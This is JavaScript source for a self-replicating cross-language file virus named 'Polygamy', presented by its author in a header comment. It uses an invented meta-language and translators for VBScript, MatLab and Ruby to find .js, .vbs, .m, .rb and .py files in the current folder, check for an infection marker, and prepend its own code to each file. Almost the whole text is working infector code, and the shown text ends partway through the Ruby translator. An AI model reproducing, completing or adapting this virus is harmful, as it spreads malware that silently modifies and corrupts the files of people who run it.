//////////////////////////////////////////////////////////////////////////////
//
//  JS/VBS/MatLab/Ruby/Python.Polygamy
//  by Second Part To Hell
//  July 2013
//
//  This is a five-language cross infector for JavaScript, VBScript, MatLab,
//  Ruby and Python - using a special MetaLanguage.
// 
//  The virus contains the infection-routines for every language written in a
//  MetaLanguage. The MetaLanguage is translated into actual code with a
//  language-dependent translator (therefor there are five independent
//  translators in this code).
//
//  The main reason for this concept is the linear scaling of code-size and
//  complexity with the number of languages. That means, adding a 6th language
//  is as simple as adding the 2nd language. I hope I will see additional
//  translators for other languages some day. :)
//
//  For more infos, see my text "Cross Script Infection using MetaLanguages" in
//  valhalla#4.
//
//////////////////////////////////////////////////////////////////////////////

metaLanguage="Predefined";
metaLanguage+="__AddML";

metaLanguage+="__Forall js";
metaLanguage+="__  GetFileName fileName";
metaLanguage+="__  ReadAll allContent fileName";
metaLanguage+="__  Def infectionMarkerJS"; 
metaLanguage+="__  AddString infectionMarkerJS metaLanguage";
metaLanguage+="__  Exist doesExist allContent infectionMarkerJS";
metaLanguage+="__  If doesExist < 0";
metaLanguage+="__    Def newCodeJS";
metaLanguage+="__    AddString newCodeJS metaLanguage=";
metaLanguage+="__    AddChar newCodeJS 39 39";
metaLanguage+="__    AddString newCodeJS ;translatorJS=";
metaLanguage+="__    AddChar newCodeJS 39 39";
metaLanguage+="__    AddString newCodeJS ;translatorVBS=";
metaLanguage+="__    AddChar newCodeJS 39 39";
metaLanguage+="__    AddString newCodeJS ;translatorMatLab=";
metaLanguage+="__    AddChar newCodeJS 39 39";
metaLanguage+="__    AddString newCodeJS ;translatorRuby=";
metaLanguage+="__    AddChar newCodeJS 39 39";
metaLanguage+="__    AddString newCodeJS ;translatorPython=";
metaLanguage+="__    AddChar newCodeJS 39 39 59";
metaLanguage+="__    AddStringAsChar newCodeJS metaLanguage+=String.fromCharCode( metaLanguage , );";
metaLanguage+="__    AddStringAsChar newCodeJS translatorJS+=String.fromCharCode( translatorJS , );";
metaLanguage+="__    AddStringAsChar newCodeJS translatorVBS+=String.fromCharCode( translatorVBS , );";
metaLanguage+="__    AddStringAsChar newCodeJS translatorMatLab+=String.fromCharCode( translatorMatLab , );";
metaLanguage+="__    AddStringAsChar newCodeJS translatorRuby+=String.fromCharCode( translatorRuby , );";
metaLanguage+="__    AddStringAsChar newCodeJS translatorPython+=String.fromCharCode( translatorPython , );";
metaLanguage+="__    Arithmetic newCodeJS newCodeJS + translatorJS";         
metaLanguage+="__    Arithmetic newCodeJS newCodeJS + allContent";
metaLanguage+="__    Write fileName newCodeJS";
metaLanguage+="__  XX"
metaLanguage+="__XX"
metaLanguage+="__Forall vbs";
metaLanguage+="__  GetFileName fileName";
metaLanguage+="__  ReadAll allContent fileName";
metaLanguage+="__  Def infectionMarkerVBS"; 
metaLanguage+="__  AddString infectionMarkerVBS metaLanguage";
metaLanguage+="__  Exist doesExist allContent infectionMarkerVBS";
metaLanguage+="__  If doesExist < 0";
metaLanguage+="__    Def newCodeVBS";
metaLanguage+="__    AddString newCodeVBS Dim"
metaLanguage+="__    AddChar newCodeVBS 32"
metaLanguage+="__    AddString newCodeVBS metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython";
metaLanguage+="__    AddChar newCodeVBS 13 10"
metaLanguage+="__    AddStringAsChar newCodeVBS metaLanguage=metaLanguage+Chr( metaLanguage )+Chr( )";
metaLanguage+="__    AddStringAsChar newCodeVBS translatorJS=translatorJS+Chr( translatorJS )+Chr( )";
metaLanguage+="__    AddStringAsChar newCodeVBS translatorVBS=translatorVBS+Chr( translatorVBS )+Chr( )";
metaLanguage+="__    AddStringAsChar newCodeVBS translatorMatLab=translatorMatLab+Chr( translatorMatLab )+Chr( )";
metaLanguage+="__    AddStringAsChar newCodeVBS translatorRuby=translatorRuby+Chr( translatorRuby )+Chr( )";
metaLanguage+="__    AddStringAsChar newCodeVBS translatorPython=translatorPython+Chr( translatorPython )+Chr( )";
metaLanguage+="__    Arithmetic newCodeVBS newCodeVBS + translatorVBS";
metaLanguage+="__    Arithmetic newCodeVBS newCodeVBS + allContent";
metaLanguage+="__    Write fileName newCodeVBS";
metaLanguage+="__  XX"
metaLanguage+="__XX"
metaLanguage+="__Forall m";
metaLanguage+="__  GetFileName fileName";
metaLanguage+="__  ReadAll allContent fileName";
metaLanguage+="__  Def infectionMarkerMatLab"; 
metaLanguage+="__  AddString infectionMarkerMatLab metaLanguage";
metaLanguage+="__  Exist doesExist allContent infectionMarkerMatLab";
metaLanguage+="__  If doesExist < 0";
metaLanguage+="__    Def newCodeMatLab";
metaLanguage+="__    AddString newCodeMatLab metaLanguage=[];translatorJS=[];translatorVBS=[];translatorMatLab=[];translatorRuby=[];translatorPython=[];";
metaLanguage+="__    AddChar newCodeMatLab 13 10"
metaLanguage+="__    AddStringAsChar newCodeMatLab metaLanguage=[metaLanguage,char([ metaLanguage , ])];";
metaLanguage+="__    AddStringAsChar newCodeMatLab translatorJS=[translatorJS,char([ translatorJS , ])];";
metaLanguage+="__    AddStringAsChar newCodeMatLab translatorVBS=[translatorVBS,char([ translatorVBS , ])];";
metaLanguage+="__    AddStringAsChar newCodeMatLab translatorMatLab=[translatorMatLab,char([ translatorMatLab , ])];";
metaLanguage+="__    AddStringAsChar newCodeMatLab translatorRuby=[translatorRuby,char([ translatorRuby , ])];";
metaLanguage+="__    AddStringAsChar newCodeMatLab translatorPython=[translatorPython,char([ translatorPython , ])];";
metaLanguage+="__    AddString newCodeMatLab h=fopen(";
metaLanguage+="__    AddChar newCodeMatLab 39";
metaLanguage+="__    AddString newCodeMatLab createBlockOfCode.m";
metaLanguage+="__    AddChar newCodeMatLab 39 44 39 119 39";
metaLanguage+="__    AddString newCodeMatLab );fwrite(h,translatorMatLab);fclose(h);rehash;xx={};ML=[char([95,95]),metaLanguage];SplitOffset=[strfind(ML,char([95,95])),length(ML)+1];for";
metaLanguage+="__    AddChar newCodeMatLab 32";
metaLanguage+="__    AddString newCodeMatLab i=1:length(SplitOffset)-1;xx{end+1}=ML(SplitOffset(i)+2:SplitOffset(i+1)-1);end;eval(createBlockOfCode(xx,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython));delete(";
metaLanguage+="__    AddChar newCodeMatLab 39";
metaLanguage+="__    AddString newCodeMatLab createBlockOfCode.m";
metaLanguage+="__    AddChar newCodeMatLab 39";
metaLanguage+="__    AddString newCodeMatLab );";
metaLanguage+="__    AddChar newCodeMatLab 13 10";
metaLanguage+="__    Arithmetic newCodeMatLab newCodeMatLab + allContent";
metaLanguage+="__    Write fileName newCodeMatLab";
metaLanguage+="__  XX"
metaLanguage+="__XX"
metaLanguage+="__Forall rb";
metaLanguage+="__  GetFileName fileName";
metaLanguage+="__  ReadAll allContent fileName";
metaLanguage+="__  Def infectionMarkerRuby"; 
metaLanguage+="__  AddString infectionMarkerRuby metaLanguage";
metaLanguage+="__  Exist doesExist allContent infectionMarkerRuby";
metaLanguage+="__  If doesExist < 0";
metaLanguage+="__    Def newCodeRuby";
metaLanguage+="__    AddString newCodeRuby metaLanguage=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddString newCodeRuby ;translatorJS=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddString newCodeRuby ;translatorVBS=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddString newCodeRuby ;translatorMatLab=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddString newCodeRuby ;translatorRuby=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddString newCodeRuby ;translatorPython=";
metaLanguage+="__    AddChar newCodeRuby 39 39";
metaLanguage+="__    AddChar newCodeRuby 13 10"
metaLanguage+="__    AddStringAsChar newCodeRuby metaLanguage<< metaLanguage .chr<< .chr;";
metaLanguage+="__    AddStringAsChar newCodeRuby translatorJS<< translatorJS .chr<< .chr;";
metaLanguage+="__    AddStringAsChar newCodeRuby translatorVBS<< translatorVBS .chr<< .chr;";
metaLanguage+="__    AddStringAsChar newCodeRuby translatorMatLab<< translatorMatLab .chr<< .chr;";
metaLanguage+="__    AddStringAsChar newCodeRuby translatorRuby<< translatorRuby .chr<< .chr;";
metaLanguage+="__    AddStringAsChar newCodeRuby translatorPython<< translatorPython .chr<< .chr;";
metaLanguage+="__    Arithmetic newCodeRuby newCodeRuby + translatorRuby";         
metaLanguage+="__    Arithmetic newCodeRuby newCodeRuby + allContent";
metaLanguage+="__    Write fileName newCodeRuby";
metaLanguage+="__  XX"
metaLanguage+="__XX"
metaLanguage+="__Forall py";
metaLanguage+="__  GetFileName fileName";
metaLanguage+="__  ReadAll allContent fileName";
metaLanguage+="__  Def infectionMarkerPython"; 
metaLanguage+="__  AddString infectionMarkerPython metaLanguage";
metaLanguage+="__  Exist doesExist allContent infectionMarkerPython";
metaLanguage+="__  If doesExist < 0";
metaLanguage+="__    Def newCodePython";
metaLanguage+="__    AddString newCodePython metaLanguage=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddString newCodePython ;translatorJS=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddString newCodePython ;translatorVBS=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddString newCodePython ;translatorMatLab=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddString newCodePython ;translatorRuby=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddString newCodePython ;translatorPython=";
metaLanguage+="__    AddChar newCodePython 39 39";
metaLanguage+="__    AddChar newCodePython 13 10"
metaLanguage+="__    AddStringAsChar newCodePython metaLanguage+=chr( metaLanguage )+chr( )";
metaLanguage+="__    AddStringAsChar newCodePython translatorJS+=chr( translatorJS )+chr( )";
metaLanguage+="__    AddStringAsChar newCodePython translatorVBS+=chr( translatorVBS )+chr( )";
metaLanguage+="__    AddStringAsChar newCodePython translatorMatLab+=chr( translatorMatLab )+chr( )";
metaLanguage+="__    AddStringAsChar newCodePython translatorRuby+=chr( translatorRuby )+chr( )";
metaLanguage+="__    AddStringAsChar newCodePython translatorPython+=chr( translatorPython )+chr( )";
metaLanguage+="__    Arithmetic newCodePython newCodePython + translatorPython";         
metaLanguage+="__    Arithmetic newCodePython newCodePython + allContent";
metaLanguage+="__    Write fileName newCodePython";
metaLanguage+="__  XX"
metaLanguage+="__XX"

nl=String.fromCharCode(13,10)
translatorVBS='Function createBlockOfCode(CodeBlockArray)'+nl;
translatorVBS+='    Dim RString, i'+nl;
translatorVBS+='    RString=""'+nl;
translatorVBS+='    For i=0 To UBound(CodeBlockArray)'+nl;
translatorVBS+='        LineCode=Split(CodeBlockArray(i),Chr(32))'+nl;
translatorVBS+='        If LineCode(0)="Predefined" Then'+nl;
translatorVBS+='            RString=RString+"set fso=CreateObject("+Chr(34)+"Scripting.FileSystemObject"+Chr(34)+")"+nl'+nl;            
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="Forall" Then'+nl;
translatorVBS+='            RString=RString+"For Each x in fso.getfolder("+Chr(34)+"."+Chr(34)+").files"+nl'+nl;
translatorVBS+='            RString=RString+"If lcase(fso.getextensionname(x))="+Chr(34)+LineCode(1)+Chr(34)+" Then"+nl'+nl;
translatorVBS+='            Dim j, NewBlock'+nl;
translatorVBS+='            NewBlock=Array()'+nl;
translatorVBS+='            j=i+1'+nl;
translatorVBS+='            Do While Left(CodeBlockArray(j),2)="  "'+nl;
translatorVBS+='                ReDim Preserve NewBlock(UBound(NewBlock) + 1)'+nl;
translatorVBS+='                NewBlock(UBound(NewBlock))=Mid(CodeBlockArray(j),3)'+nl;
translatorVBS+='                j=j+1'+nl;
translatorVBS+='            Loop'+nl;    
translatorVBS+='            RString=RString+createBlockOfCode(NewBlock)'+nl;             
translatorVBS+='            RString=RString+"End If"+nl'+nl;
translatorVBS+='            RString=RString+"Next"+nl'+nl;                 
translatorVBS+='        End If'+nl;   
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="If" Then'+nl;
translatorVBS+='            RString=RString+"If "+LineCode(1)+LineCode(2)+LineCode(3)+" Then"+nl'+nl;
translatorVBS+='            Dim k, NewBlockIf'+nl;
translatorVBS+='            NewBlockIf=Array()'+nl;
translatorVBS+='            k=i+1'+nl;
translatorVBS+='            Do While Left(CodeBlockArray(k),2)="  "'+nl;
translatorVBS+='                ReDim Preserve NewBlockIf(UBound(NewBlockIf) + 1)'+nl;
translatorVBS+='                NewBlockIf(UBound(NewBlockIf))=Mid(CodeBlockArray(k),3)'+nl;
translatorVBS+='                k=k+1'+nl;  
translatorVBS+='            Loop'+nl;    
translatorVBS+='            RString=RString+createBlockOfCode(NewBlockIf)'+nl;
translatorVBS+='            RString=RString+"End If"+nl'+nl;
translatorVBS+='        End If'+nl;     
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="GetFileName" Then'+nl;
translatorVBS+='            RString=RString+LineCode(1)+"=x"+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="ReadAll" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+"=fso.opentextfile("+LineCode(2)+").readall"+nl'+nl;
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;
translatorVBS+='        If LineCode(0)="Exist" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+"=InStr("+LineCode(2)+","+LineCode(3)+")-1"+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;
translatorVBS+='        If LineCode(0)="Def" Then'+nl; 
translatorVBS+='             RString=RString+"Dim "+LineCode(1)+nl'+nl;
translatorVBS+='             RString=RString+LineCode(1)+"="+Chr(34)+Chr(34)+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="Arithmetic" Then'+nl;
translatorVBS+='             RString=RString+LineCode(1)+"="+LineCode(2)+LineCode(3)+LineCode(4)+nl'+nl;
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="Write" Then'+nl;
translatorVBS+='             RString=RString+"fso.opentextfile("+LineCode(1)+",2).write "+LineCode(2)+nl'+nl;      
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="AddString" Then'+nl;
translatorVBS+='            RString=RString+LineCode(1)+"="+LineCode(1)+"+"+Chr(34)+LineCode(2)+Chr(34)+nl'+nl;
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="AddChar" Then'+nl; 
translatorVBS+='            RString=RString+LineCode(1)+"="+LineCode(1)'+nl; 
translatorVBS+='            Dim n'+nl; 
translatorVBS+='            For n=2 To UBound(LineCode)'+nl; 
translatorVBS+='                RString=RString+"+Chr("+LineCode(n)+")"'+nl;     
translatorVBS+='            Next'+nl;  
translatorVBS+='            RString=RString+nl'+nl;           
translatorVBS+='        End If'+nl;        
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="AddML" Then'+nl;
translatorVBS+='            RString=RString+"metaLanguage="'+nl;
translatorVBS+='            Dim l'+nl;
translatorVBS+='            For l=1 To Len(metaLanguage)'+nl;
translatorVBS+='                RString=RString+"Chr("'+nl;
translatorVBS+='                RString=RString+CStr(Asc(Mid(metaLanguage,l,1)))'+nl;
translatorVBS+='                RString=RString+")+"'+nl;
translatorVBS+='            Next'+nl;
translatorVBS+='            RString=Left(RString,Len(RString)-1)+nl'+nl;           
translatorVBS+='        End If'+nl;
translatorVBS+=''+nl;        
translatorVBS+='        If LineCode(0)="AddStringAsChar" Then'+nl;
translatorVBS+='            Dim StringTrafo, m, TmpVar, qq'+nl;
translatorVBS+='            StringTrafo=Eval(LineCode(3))'+nl;
translatorVBS+='            qq=1'+nl;
translatorVBS+='            While qq<Len(StringTrafo)'+nl;
translatorVBS+='                count=1000'+nl;
translatorVBS+='                TmpVar=""'+nl;
translatorVBS+='                If Len(StringTrafo)-qq<1000 Then'+nl;
translatorVBS+='                    count=Len(StringTrafo)-qq'+nl;
translatorVBS+='                End If'+nl;
translatorVBS+='                For m=0 To count'+nl;
translatorVBS+='                    TmpVar=TmpVar+CStr(Asc(Mid(StringTrafo,qq,1)))+LineCode(4)'+nl;
translatorVBS+='                    qq=qq+1'+nl;
translatorVBS+='                Next'+nl;
translatorVBS+='                RString=RString+LineCode(1)+"="+LineCode(1)+"+"+Chr(34)+LineCode(2)+Left(TmpVar,Len(TmpVar)-Len(LineCode(4)))+LineCode(5)+Chr(34)+nl'+nl;
translatorVBS+='                RString=RString+LineCode(1)+"="+LineCode(1)+"+Chr(13)+Chr(10)"+nl'+nl;
translatorVBS+='            Wend'+nl;
translatorVBS+='        End If'+nl; 
translatorVBS+='    Next'+nl;
translatorVBS+='    createBlockOfCode=RString'+nl;    
translatorVBS+='End Function'+nl;
translatorVBS+=''+nl;
translatorVBS+='nl=Chr(13)+Chr(10)'+nl;
translatorVBS+='xx=Split(metaLanguage,"__")'+nl;
translatorVBS+='MyCode=createBlockOfCode(xx)'+nl;
translatorVBS+='Execute(MyCode)'+nl;

translatorMatLab="function RString = createBlockOfCode(CodeBlockArray,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)"+nl;
translatorMatLab+="nl=char([13 10]);"+nl;    
translatorMatLab+="RString='';"+nl;
translatorMatLab+="    for i=1:length(CodeBlockArray)"+nl;        
translatorMatLab+="        LineCode=[];"+nl;
translatorMatLab+="        tmpCBA=CodeBlockArray{i};"+nl;
translatorMatLab+="        SplitOffset=[1 strfind(tmpCBA,' ') length(tmpCBA)+1];"+nl;
translatorMatLab+="        for j=1:length(SplitOffset)-1"+nl;
translatorMatLab+="            LineCode{end+1}=tmpCBA(SplitOffset(j):SplitOffset(j+1)-1);"+nl;
translatorMatLab+="        end"+nl;
translatorMatLab+="        if(strcmp(LineCode(1),'Forall'))"+nl;
translatorMatLab+="            RString=[RString 'e=dir(' char(39) '*.' LineCode{2}(2:end) char(39) ');' nl];"+nl;
translatorMatLab+="            RString=[RString 'for d=1:length(e) ' nl];"+nl;
translatorMatLab+="            j=i+1;NewBlock={};"+nl;
translatorMatLab+="            while strcmp(CodeBlockArray{j}(1:2),'  ')"+nl;
translatorMatLab+="                NewBlock{end+1}=CodeBlockArray{j}(3:end);"+nl;
translatorMatLab+="                j=j+1;"+nl;
translatorMatLab+="            end"+nl;
translatorMatLab+="            RString=[RString createBlockOfCode(NewBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)];"+nl;
translatorMatLab+="            RString=[RString 'end;' nl];"+nl;
translatorMatLab+="        end"+nl;    
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'If'))"+nl;
translatorMatLab+="            RString=[RString 'if ' LineCode{2}(2:end) LineCode{3}(2:end) LineCode{4}(2:end) nl];"+nl;
translatorMatLab+="            j=i+1;NewBlock={};"+nl;
translatorMatLab+="            while strcmp(CodeBlockArray{j}(1:2),'  ')"+nl;
translatorMatLab+="                NewBlock{end+1}=CodeBlockArray{j}(3:end);"+nl;
translatorMatLab+="                j=j+1;"+nl;
translatorMatLab+="            end"+nl;
translatorMatLab+="            RString=[RString createBlockOfCode(NewBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)];"+nl;
translatorMatLab+="            RString=[RString 'end;' nl];"+nl;            
translatorMatLab+="        end"+nl;           
translatorMatLab+=""+nl;
translatorMatLab+="        if(strcmp(LineCode(1),'GetFileName'))"+nl;     
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=e(d).name;' nl];"+nl;
translatorMatLab+="        end"+nl;
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'ReadAll'))"+nl;     
translatorMatLab+="            RString=[RString 'tmpML=fopen(' LineCode{3}(2:end) ',' char(39) 'r+' char(39) ');' nl];"+nl;
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=fread(tmpML,' char(39) '*char' char(39) ')' char(39) ';' nl];"+nl;
translatorMatLab+="            RString=[RString 'fclose(tmpML);' nl];"+nl;
translatorMatLab+="        end"+nl;        
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'Exist'))"+nl;     
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=length(findstr(' LineCode{3}(2:end) ',' LineCode{4}(2:end) '))-1;' nl];"+nl;
translatorMatLab+="        end"+nl;   
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'Def'))"+nl;     
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=[];' nl];"+nl;
translatorMatLab+="        end"+nl;   
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'Arithmetic'))"+nl;     
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=[' LineCode{3}(2:end) ' ' LineCode{5}(2:end) '];' nl];"+nl;
translatorMatLab+="        end"+nl;   
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'Write'))"+nl;     
translatorMatLab+="            RString=[RString 'tmpML=fopen(' LineCode{2}(2:end) ',' char(39) 'r+' char(39) ');' nl];"+nl;
translatorMatLab+="            RString=[RString 'fwrite(tmpML,' LineCode{3}(2:end) ');' nl];"+nl;
translatorMatLab+="            RString=[RString 'fclose(tmpML);' nl];"+nl;
translatorMatLab+="        end"+nl;   
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'AddString'))"+nl; 
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' ' char(39) LineCode{3}(2:end) char(39) '];' nl];"+nl;
translatorMatLab+="        end"+nl;          
translatorMatLab+=""+nl;        
translatorMatLab+="        if(strcmp(LineCode(1),'AddChar'))"+nl;     
translatorMatLab+="            RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' '];"+nl;
translatorMatLab+="            for j=3:length(LineCode)"+nl;
translatorMatLab+="                RString=[RString 'char(' LineCode{j}(2:end) ') '];"+nl;
translatorMatLab+="            end"+nl;
translatorMatLab+="            RString=[RString '];' nl];"+nl;
translatorMatLab+="        end"+nl;           
translatorMatLab+=""+nl;        
translatorMatLab+="        if strcmp(LineCode(1),'AddML')"+nl;
translatorMatLab+="            RString=[RString 'metaLanguage=char([' int2str(metaLanguage-0) ']);' nl];"+nl;
translatorMatLab+="        end"+nl;
translatorMatLab+=""+nl;        
translatorMatLab+="        if strcmp(LineCode(1),'AddStringAsChar')"+nl;
translatorMatLab+="            StringTrafo=eval(LineCode{4}(2:end));"+nl;
translatorMatLab+="            j=1;"+nl;
translatorMatLab+="            while j<length(StringTrafo)"+nl;
translatorMatLab+="                count=1000;"+nl;
translatorMatLab+="                TmpVar='';"+nl;
translatorMatLab+="                if length(StringTrafo)-j<1000"+nl;
translatorMatLab+="                    count=length(StringTrafo)-j+1;"+nl;
translatorMatLab+="                end;"+nl;
translatorMatLab+="                for k=1:count"+nl;
translatorMatLab+="                    TmpVar=[TmpVar int2str(StringTrafo(j)-0) LineCode{5}(2:end)];"+nl;
translatorMatLab+="                    j=j+1;"+nl;
translatorMatLab+="                end"+nl;                        
translatorMatLab+="                RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' ' char(39) LineCode{3}(2:end) TmpVar(1:end-length(LineCode{5})+1) LineCode{6}(2:end) char(39) '];' nl];"+nl;
translatorMatLab+="                RString=[RString LineCode{2}(2:end) '=[' LineCode{2}(2:end) ' char([13,10])];' nl];"+nl;
translatorMatLab+="            end"+nl;
translatorMatLab+="        end"+nl;
translatorMatLab+="    end"+nl;
translatorMatLab+="end"+nl;

translatorRuby='def createBlockOfCode(codeBlockArray,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython)'+nl;
translatorRuby+='    rString=""'+nl;
translatorRuby+='    i=0'+nl;
translatorRuby+='    while i<codeBlockArray.length'+nl;
translatorRuby+='        lineCode=codeBlockArray[i].split(/ /)'+nl;
translatorRuby+='        if lineCode[0].eql? "Forall"'+nl;
translatorRuby+='            rString << "c=Dir.open(Dir.getwd);c.each do |d|" << 13.chr << 10.chr << "if File.exist?(d) && File.extname(d)==" << 34.chr << "." << lineCode[1] << 34.chr << ";"'+nl;
translatorRuby+='            j=i+1;newBlock=[]'+nl;
translatorRuby+='            while codeBlockArray[j][0,2].eql? "  "'+nl;
translatorRuby+='                newBlock.push(codeBlockArray[j][2,codeBlockArray[j].length]);'+nl;
translatorRuby+='                j+=1;'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='            rString << createBlockOfCode(newBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython) << "end;end" << 13.chr << 10.chr'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "If"'+nl;
translatorRuby+='            rString << "if " << lineCode[1] << lineCode[2] << lineCode[3] << 13.chr << 10.chr'+nl;
translatorRuby+='            j=i+1;newBlock=[]'+nl;
translatorRuby+='            while codeBlockArray[j][0,2].eql? "  "'+nl;
translatorRuby+='                newBlock.push(codeBlockArray[j][2,codeBlockArray[j].length])'+nl;
translatorRuby+='                j+=1'+nl;
translatorRuby+='            end;'+nl;
translatorRuby+='            rString << createBlockOfCode(newBlock,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython) << "end" << 13.chr << 10.chr'+nl;  
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "GetFileName"'+nl;      
translatorRuby+='            rString << lineCode[1] << "=d;"'+nl;
translatorRuby+='        end'+nl;  
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "ReadAll"'+nl;      
translatorRuby+='            rString << "f=File.open(" << lineCode[2] << "," << 34.chr << "r+" << 34.chr << ");" << lineCode[1] << "=f.read(File.size(f));f.close;"'+nl;
translatorRuby+='        end'+nl;          
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "Exist"'+nl;      
translatorRuby+='            rString << "tmp=" << lineCode[2] << ".include?(" << lineCode[3] << ");" << lineCode[1] << "=0;if !tmp;" << lineCode[1] <<"=-1;end;"'+nl;
translatorRuby+='        end'+nl;   
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "Def"'+nl;      
translatorRuby+='            rString<<lineCode[1]<<"="<<34.chr<<34.chr<<";";'+nl;
translatorRuby+='        end'+nl;   
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "Arithmetic"'+nl;      
translatorRuby+='            rString<<lineCode[1]<<"="<<lineCode[2]<<"<<"<<lineCode[4]<<";";'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "Write"'+nl;      
translatorRuby+='            rString<<"a=File.open("<<lineCode[1]<<","<<34.chr<<"w"<<34.chr<<");a.write("<<lineCode[2]<<");a.close;"'+nl;
translatorRuby+='        end'+nl;        
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "AddString"'+nl;      
translatorRuby+='            rString<<lineCode[1]<<"<<"<<34.chr<<lineCode[2]<<34.chr<<";"'+nl;
translatorRuby+='        end'+nl;     
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "AddChar"'+nl;      
translatorRuby+='            rString<<lineCode[1];'+nl;
translatorRuby+='            j=2;'+nl;
translatorRuby+='            while j<lineCode.length'+nl;
translatorRuby+='                rString <<"<<"<<lineCode[j]<<".chr";'+nl;
translatorRuby+='                j+=1;'+nl;                
translatorRuby+='            end'+nl;
translatorRuby+='            rString<<";"'+nl;
translatorRuby+='        end'+nl;                      
translatorRuby+=''+nl;
translatorRuby+='        if lineCode[0].eql? "AddML"'+nl;
translatorRuby+='            j=0;'+nl;
translatorRuby+='            while j<metaLanguage.length'+nl;
translatorRuby+='                rString<<"metaLanguage";'+nl;
translatorRuby+='                count=1000;'+nl;
translatorRuby+='                tmpVar="";'+nl;
translatorRuby+='                if metaLanguage.length-j<1000'+nl;
translatorRuby+='                    count=metaLanguage.length-j;'+nl;
translatorRuby+='                end;'+nl;
translatorRuby+='                k=0;'+nl;
translatorRuby+='                while k<count'+nl;
translatorRuby+='                    tmpVar<<metaLanguage[j].ord.to_s()<<".chr<<"'+nl;
translatorRuby+='                    j+=1;k+=1;'+nl;
translatorRuby+='                end;'+nl;             
translatorRuby+='                rString <<"<<"<<tmpVar[0..tmpVar.length-3]<<";"<<13.chr<<10.chr;'+nl;
translatorRuby+='                j+=1;'+nl;
translatorRuby+='            end'+nl;
translatorRuby+='            rString<<";"'+nl;
translatorRuby+='        end'+nl;
translatorRuby+=''+nl;        
translatorRuby+='        if lineCode[0].eql? "AddStringAsChar"'+nl;      
translatorRuby+='            stringTrafo=eval(lineCode[3]);'+nl;
translatorRuby+='            j=0;'+nl;
translatorRuby+='            while j<stringTrafo.length'+nl;
translatorRuby+='                count=1000;'+nl;
translatorRuby+='                tmpVar="";'+nl;
translatorRuby+='                if stringTrafo.length-j<1000'+nl;
translatorRuby+='                    count=stringTrafo.length-j;'+nl;
translatorRuby+='                end;'+nl;
translatorRuby+='                k=0;'+nl;
translatorRuby+='                while k<count'+nl;
translatorRuby+='                    tmpVar<<stringTrafo[j].ord.to_s()<<lineCode[4]'+nl;
translatorRuby+='                    j+=1;k+=1;'+nl;
translatorRuby+='                end;'+nl;
